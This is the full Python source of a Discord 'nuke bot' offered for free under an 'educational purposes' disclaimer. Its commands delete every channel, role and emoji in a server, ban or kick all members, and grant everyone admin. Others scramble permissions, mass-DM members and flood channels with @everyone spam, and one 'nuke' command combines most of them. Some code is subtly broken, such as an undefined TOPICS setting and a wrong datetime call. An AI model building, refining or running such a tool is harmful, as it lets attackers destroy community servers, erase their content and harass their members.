# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from datetime import datetime
import random

# CONFIG #
class Config:
    # ===== BOT SETTINGS =====
    TOKEN = ""  # Your bot token from Discord Developer Portal
    PREFIX = "."  # The prefix to use before commands (e.g. .nuke)
    WHITELIST = []  # List of user IDs who can use the bot commands

    # ===== MESSAGE SETTINGS =====
    SPAM_MESSAGE = "@everyone"  # The message that will be spammed in channels
    SPAM_COUNT = 10  # How many times to send the spam message in each channel
    TEXT_TO_SPEECH = False  # If true, messages will be read aloud by Discord's text-to-speech
    DM_MESSAGE = "THE SERVER GOT NUKED"  # Message sent to all members via direct message

    # ===== CHANNEL SETTINGS =====
    CHANNEL_NAME = "nuked"  # Base name for created text channels
    CHANNELS_COUNT = 10  # How many text channels to create
    NEW_CHANNEL_NAME = "renamed-nuked"  # Name pattern when renaming existing channels
    VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
    VOICE_CHANNEL_NAME = "NUKED"  # Base name for created voice channels
    CATEGORY_NAME = "NUKED"  # Base name for created categories
    CATEGORIES_COUNT = 5  # How many categories to create
    THREAD_COUNT = 5  # How many threads to create in each text channel
    THREAD_NAME = "nuked"  # Base name for created threads
    NSFW_CHANNEL_NAME = "nuked"  # Base name for NSFW channels
    SLOWMODE_DURATION = 300  # Slowmode duration in seconds for all channels

    # ===== ROLE SETTINGS =====
    ROLE_NAME = "nuked"  # Base name for created roles
    ROLES_COUNT = 10  # How many roles to create
    NEW_ROLE_NAME = "renamed-nuked"  # Name pattern when renaming existing roles
    ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone

    # ===== SERVER SETTINGS =====
    SERVER_NAME = "NUKED SERVER"  # New name for the server
    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"  # URL of new server icon
    NICKNAME = "NUKED_LOSER"  # New nickname for all members
    TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work

    # ===== WEBHOOK SETTINGS =====
    WEBHOOK_NAME = "NUKED_WEBHOOK"  # Base name for created webhooks
    WEBHOOK_COUNT = 10  # How many webhooks to create per channel
    WEBHOOK_RENAME = "RENAMED_NUKED_WEBHOOK"  # Name pattern when renaming webhooks

    # ===== INVITE SETTINGS =====
    INVITE_COUNT = 10  # How many invite links to create per channel

    # ===== PIN SETTINGS =====
    PIN_SPAM_COUNT = 5  # How many random messages to pin in each channel

    # ===== VOICE SETTINGS =====
    MOVE_VOICE_CHANNEL_NAME = "LOSERS"  # Name of voice channel to moves everyone to

    # ===== PERMISSION SETTINGS =====
    CHAOS_PERMISSIONS = [True, False, None]  # Random permission states for chaos commands, do not change if you dont know what your doing


# ===== MAIN CODE, ONLY CHANGE IF YOU KNOW WHAT YOUR DOING. =====
config = Config()
bot = commands.Bot(command_prefix=config.PREFIX, intents=discord.Intents.all())
bot.remove_command("help")

def is_whitelisted(ctx):
    return ctx.author.id in config.WHITELIST

async def download_image(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return await response.read()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.event
async def on_command(ctx):
    if is_whitelisted(ctx):
        await asyncio.sleep(0.1)
        try:
            await ctx.message.delete()
        except:
            pass

@bot.command()
async def rserver(ctx):
    if not is_whitelisted(ctx): return
    await ctx.guild.edit(name=config.SERVER_NAME)

@bot.command()
async def rservericon(ctx):
    if not is_whitelisted(ctx): return
    icon_image = await download_image(config.SERVER_ICON_URL)
    await ctx.guild.edit(icon=icon_image)

@bot.command()
async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}") for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}-{i}") for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}-{i}") for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def cthread(ctx, count: int = config.THREAD_COUNT):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        for i in range(count):
            tasks.append(channel.create_thread(name=f"{config.THREAD_NAME}-{i}", auto_archive_duration=60))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    tasks = []
    for i in range(count):
        channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}-{i}")
        tasks.append(channel.edit(nsfw=True))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dchannels(ctx):
    if not is_whitelisted(ctx): return
    tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.guild.create_text_channel(config.CHANNEL_NAME)

@bot.command()
async def dcategory(ctx):
    if not is_whitelisted(ctx): return
    tasks = [category.delete() for category in ctx.guild.categories]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def rchannels(ctx):
    if not is_whitelisted(ctx): return
    tasks = [channel.edit(name=f"{config.NEW_CHANNEL_NAME}-{i}") for i, channel in enumerate(ctx.guild.channels)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def nsfwall(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        tasks.append(channel.edit(nsfw=True))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def rtopics(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        tasks.append(channel.edit(topic=random.choice(config.TOPICS)))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        tasks.append(channel.edit(slowmode_delay=seconds))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def croles(ctx, count: int = config.ROLES_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}") for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def droles(ctx):
    if not is_whitelisted(ctx): return
    tasks = [role.delete() for role in ctx.guild.roles if role.name != "@everyone"]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def rroles(ctx):
    if not is_whitelisted(ctx): return
    tasks = [role.edit(name=f"{config.NEW_ROLE_NAME}-{i}") for i, role in enumerate(ctx.guild.roles) if role.name != "@everyone"]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def adminall(ctx):
    if not is_whitelisted(ctx): return
    admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
    tasks = [member.add_roles(admin_role) for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def rnickall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.edit(nick=config.NICKNAME) for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def demoteall(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for member in ctx.guild.members:
        roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
        tasks.append(member.remove_roles(*roles_to_remove))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def moveall(ctx):
    if not is_whitelisted(ctx): return
    vc = await ctx.guild.create_voice_channel(config.MOVE_VOICE_CHANNEL_NAME)
    tasks = [member.move_to(vc) for member in ctx.guild.members if member.voice]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def disconnectall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.move_to(None) for member in ctx.guild.members if member.voice]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def banall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.ban() for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def unbanall(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    async for entry in ctx.guild.bans():
        tasks.append(ctx.guild.unban(entry.user))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def kickall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.kick() for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def timeoutall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.timeout(datetime.timedelta(days=config.TIMEOUT_DURATION)) for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def untimeoutall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.timeout(None) for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def spam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH) for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def mspam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            tasks.append(channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def purge(ctx):
    if not is_whitelisted(ctx): return
    await ctx.channel.purge(limit=None)

@bot.command()
async def mpurge(ctx):
    if not is_whitelisted(ctx): return
    tasks = [channel.purge(limit=None) for channel in ctx.guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def rpins(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        pins = []
        async for message in channel.pins():
            pins.append(message)
        tasks.extend([message.unpin() for message in pins])
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}") for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        tasks.extend([channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}") for i in range(count)])
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dwebhooks(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        webhooks = await channel.webhooks()
        tasks.extend([webhook.delete() for webhook in webhooks])
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def rwebhooks(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.text_channels:
        webhooks = await channel.webhooks()
        tasks.extend([webhook.edit(name=f"{config.WEBHOOK_RENAME}-{i}") for i, webhook in enumerate(webhooks)])
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def cinvites(ctx, count: int = config.INVITE_COUNT):
    if not is_whitelisted(ctx): return
    tasks = [channel.create_invite() for channel in ctx.guild.text_channels for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dinvites(ctx):
    if not is_whitelisted(ctx): return
    tasks = [invite.delete() for invite in await ctx.guild.invites()]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def demojis(ctx):
    if not is_whitelisted(ctx): return
    tasks = [emoji.delete() for emoji in ctx.guild.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dstickers(ctx):
    if not is_whitelisted(ctx): return
    tasks = [sticker.delete() for sticker in ctx.guild.stickers]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dmall(ctx):
    if not is_whitelisted(ctx): return
    tasks = [member.send(config.DM_MESSAGE) for member in ctx.guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def chaoschannels(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    channels = list(ctx.guild.channels)
    random.shuffle(channels)
    for position, channel in enumerate(channels):
        tasks.append(channel.edit(position=position))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def chaosroles(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
    random.shuffle(roles)
    for position, role in enumerate(roles, start=1):
        tasks.append(role.edit(position=position))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def chaoschannelperms(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.channels:
        for role in ctx.guild.roles:
            perms = discord.PermissionOverwrite()
            perms.send_messages = random.choice(config.CHAOS_PERMISSIONS)
            perms.view_channel = random.choice(config.CHAOS_PERMISSIONS)
            perms.manage_messages = random.choice(config.CHAOS_PERMISSIONS)
            tasks.append(channel.set_permissions(role, overwrite=perms))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def chaosroleperms(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            perms = discord.Permissions()
            perms.value = random.randint(0, 8)
            tasks.append(role.edit(permissions=perms))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def lockdown(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.channels:
        tasks.append(channel.set_permissions(ctx.guild.default_role, send_messages=False))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def unlockall(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for channel in ctx.guild.channels:
        tasks.append(channel.set_permissions(ctx.guild.default_role, send_messages=None))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def nuke(ctx):
    if not is_whitelisted(ctx): return
    asyncio.create_task(ctx.message.delete())
    
    tasks = []
    tasks.append(ctx.guild.edit(name=config.SERVER_NAME))
    
    if config.SERVER_ICON_URL:
        icon_image = await download_image(config.SERVER_ICON_URL)
        if icon_image: tasks.append(ctx.guild.edit(icon=icon_image))
    
    for channel in ctx.guild.channels: tasks.append(channel.delete())
    for role in ctx.guild.roles: 
        if role.name != "@everyone" and not role.managed: tasks.append(role.delete())
    for emoji in ctx.guild.emojis: tasks.append(emoji.delete())
    for sticker in ctx.guild.stickers: tasks.append(sticker.delete())
    
    main_channel = ctx.guild.create_text_channel(config.CHANNEL_NAME, topic="Nuked")
    tasks.append(main_channel)
    
    spam_channels = []
    for i in range(config.CHANNELS_COUNT):
        spam_channels.append(ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}", topic=f"Channel {i}"))
    tasks.extend(spam_channels)
    
    for i in range(config.ROLES_COUNT):
        tasks.append(ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}"))
    
    for member in ctx.guild.members:
        if member == bot.user: continue
        if config.NICKNAME: tasks.append(member.edit(nick=config.NICKNAME))
        if config.DM_MESSAGE: tasks.append(member.send(config.DM_MESSAGE))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    created_channels = [r for r in results if isinstance(r, discord.TextChannel)]
    
    spam_tasks = []
    for channel in created_channels:
        for _ in range(config.SPAM_COUNT):
            spam_tasks.append(channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH))
    
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    
@bot.command()
async def whitelist(ctx):
    for x in range(0, len(config.WHITELIST)):
        await ctx.send(config.WHITELIST[x])

@bot.command()
async def kill(ctx):
    if not is_whitelisted(ctx): return
    for task in asyncio.all_tasks():
        if not task.done():
            task.cancel()
    await ctx.send("owch")

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(
        title="🖥️ Commands",
        description="List of available bot commands.",
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )

    categories = {
        "🔨 Moderation": [
            "`banall`",
            "`unbanall`",
            "`kickall`",
            "`timeoutall`",
            "`untimeoutall`",
            "`rnickall`",
        ],
        "📁 Channels": [
            "`ccategory`",
            "`cchannels`",
            "`chaoschannels`",
            "`chaoschannelperms`",
            "`dcategory`",
            "`dchannels`",
            "`rchannels`",
            "`cthread`",
            "`cvoice`",
            "`slowmodeall`",
            "`lockdown`",
            "`unlockall`",
            "`moveall`",
            "`disconnectall`",
            "`rtopics`",
        ],
        "🎭 Roles": [
            "`adminall`",
            "`croles`",
            "`chaosroles`",
            "`chaosroleperms`",
            "`droles`",
            "`rroles`",
            "`demoteall`",
        ],
        "🔗 Invites / Webhooks": [
            "`cinvites`",
            "`dinvites`",
            "`cwebhooks`",
            "`dwebhooks`",
            "`mwebhooks`",
            "`rwebhooks`",
        ],
        "🖼️ Server": [
            "`rserver`",
            "`rservericon`",
            "`rpins`",
            "`cnsfw`",
            "`nsfwall`",
            "`demojis`",
            "`dstickers`",
        ],
        "💬 Messages": [
            "`purge`",
            "`mpurge`",
            "`mspam`",
            "`spam`",
            "`dmall`",
        ],
        "💥 Destructive": [
            "`nuke`",
        ],
        "🧩 Bot": [
            "`kill`",
            "`whitelist`",
        ],
        "\u200b": [
            "-# Thanks to [Vexi](<https://discord.com/users/1421939463164133590>), this product is brought to you for free! 🎀"
        ]
    }

    for category, commands in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(commands),
            inline=False
        )

    await ctx.send(embed=embed)

bot.run(config.TOKEN)
